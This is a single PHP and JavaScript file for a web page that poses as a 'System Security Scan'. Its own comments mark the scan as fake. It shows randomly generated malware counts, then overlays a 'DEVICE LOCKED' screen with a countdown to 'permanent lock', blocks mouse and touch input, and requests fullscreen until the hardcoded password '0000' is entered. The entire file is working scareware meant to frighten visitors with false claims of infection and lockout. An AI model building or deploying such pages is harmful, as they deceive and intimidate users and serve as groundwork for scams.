<?php
header('Content-Type: text/html; charset=utf-8');
header('X-Frame-Options: DENY');
header('Content-Security-Policy: default-src \'self\'; script-src \'self\' \'unsafe-inline\'; style-src \'self\' \'unsafe-inline\';');

// Password configuration
$default_password = '0000';
$lock_duration = 300; // 5 minutes in seconds

// Start session for device tracking
session_start();
if (!isset($_SESSION['device_id'])) {
    $_SESSION['device_id'] = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time());
    $_SESSION['lock_start'] = time();
    $_SESSION['locked'] = true;
}

// Check if password submitted
if (isset($_POST['password'])) {
    if ($_POST['password'] === $default_password) {
        $_SESSION['locked'] = false;
        $_SESSION['unlock_time'] = time();
    } else {
        $_SESSION['failed_attempts'] = ($_SESSION['failed_attempts'] ?? 0) + 1;
    }
}

// Calculate remaining time
$current_time = time();
$elapsed_time = $current_time - $_SESSION['lock_start'];
$remaining_time = max(0, $lock_duration - $elapsed_time);
$minutes = floor($remaining_time / 60);
$seconds = $remaining_time % 60;

// Generate fake update progress
$progress = min(100, floor(($elapsed_time / 30) * 100));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Security Verification</title>
    <style>
        <?php include 'style.css'; ?>
    </style>
    <script>
        // PHP variables to JavaScript
        const LOCKED = <?php echo $_SESSION['locked'] ? 'true' : 'false'; ?>;
        const REMAINING_TIME = <?php echo $remaining_time; ?>;
        const DEVICE_ID = '<?php echo $_SESSION['device_id']; ?>';
        const FAILED_ATTEMPTS = <?php echo $_SESSION['failed_attempts'] ?? 0; ?>;
    </script>
</head>
<body>
    <div class="container">
        <?php if ($_SESSION['locked']): ?>
            <!-- Fake System Update Screen -->
            <div class="update-screen">
                <div class="header">
                    <div class="logo">🛡️</div>
                    <h1>System Security Scan</h1>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: <?php echo $progress; ?>%"></div>
                    </div>
                    <div class="progress-text">
                        Scanning system files... <?php echo $progress; ?>%
                    </div>
                    <div class="warning">
                        ⚠️ DO NOT INTERRUPT THIS PROCESS
                    </div>
                </div>
                
                <div class="scan-details">
                    <h3><i class="fas fa-search"></i> Scan Results:</h3>
                    <ul>
                        <li><?php echo rand(5, 15); ?> Malware threats detected</li>
                        <li><?php echo rand(20, 50); ?> Suspicious files found</li>
                        <li>System integrity compromised</li>
                        <li>Security protocols activated</li>
                    </ul>
                </div>
                
                <!-- Hidden Lock Screen (appears after scan) -->
                <div class="lock-screen" id="lockScreen">
                    <div class="lock-content">
                        <div class="lock-icon">🔒</div>
                        <h2>DEVICE LOCKED</h2>
                        <p>Security threat detected. Device has been secured.</p>
                        
                        <div class="password-form">
                            <form method="POST" id="unlockForm">
                                <input type="password" name="password" id="passwordInput" 
                                       placeholder="Enter administrator password" 
                                       autocomplete="off" required>
                                <button type="submit">
                                    <i class="fas fa-key"></i> UNLOCK DEVICE
                                </button>
                            </form>
                        </div>
                        
                        <?php if (isset($_SESSION['failed_attempts']) && $_SESSION['failed_attempts'] > 0): ?>
                            <div class="error-message">
                                ❌ Wrong password! Attempts: <?php echo $_SESSION['failed_attempts']; ?>
                            </div>
                        <?php endif; ?>
                        
                        <div class="timer">
                            <i class="fas fa-clock"></i>
                            <span id="countdown"><?php echo sprintf('%02d:%02d', $minutes, $seconds); ?></span>
                            until permanent lock
                        </div>
                        
                        <div class="device-info">
                            Device ID: <?php echo substr($_SESSION['device_id'], 0, 8); ?>...
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Overlay to block interactions -->
            <div class="overlay" id="blocker"></div>
            
        <?php else: ?>
            <!-- Unlock Success Screen -->
            <div class="unlock-screen">
                <div class="success-icon">✅</div>
                <h2>DEVICE UNLOCKED SUCCESSFULLY</h2>
                <p>Security protocols have been deactivated</p>
                <div class="stats">
                    <p>Lock duration: <?php echo gmdate("H:i:s", $elapsed_time); ?></p>
                    <p>Failed attempts: <?php echo $_SESSION['failed_attempts'] ?? 0; ?></p>
                </div>
                <button onclick="window.close()" class="close-btn">
                    <i class="fas fa-times"></i> CLOSE WINDOW
                </button>
                <div class="warning">
                    Note: This window may not close automatically in some browsers.
                    You may need to force close the browser.
                </div>
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        <?php if ($_SESSION['locked']): ?>
        // Lock screen functionality
        document.addEventListener('DOMContentLoaded', function() {
            // Show lock screen after 5 seconds
            setTimeout(() => {
                document.getElementById('lockScreen').style.display = 'block';
            }, 5000);
            
            // Block all interactions
            const blocker = document.getElementById('blocker');
            const events = ['click', 'touchstart', 'touchmove', 'touchend', 
                          'mousedown', 'mousemove', 'mouseup', 'contextmenu'];
            
            events.forEach(event => {
                document.addEventListener(event, function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }, true);
            });
            
            // Countdown timer
            let timeLeft = REMAINING_TIME;
            const countdownElement = document.getElementById('countdown');
            
            const timer = setInterval(() => {
                timeLeft--;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.innerHTML = '<span style="color:#ff0000">PERMANENTLY LOCKED</span>';
                    // Intensify lock
                    document.querySelector('.lock-content').style.borderColor = '#ff0000';
                    document.querySelector('.lock-content').style.boxShadow = '0 0 50px rgba(255,0,0,0.7)';
                } else {
                    const minutes = Math.floor(timeLeft / 60);
                    const seconds = timeLeft % 60;
                    countdownElement.textContent = 
                        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }
            }, 1000);
            
            // Prevent form submission spam
            let formSubmitted = false;
            document.getElementById('unlockForm').addEventListener('submit', function(e) {
                if (formSubmitted) {
                    e.preventDefault();
                    return false;
                }
                formSubmitted = true;
                return true;
            });
            
            // Request fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }
        });
        <?php endif; ?>
    </script>
</body>
</html>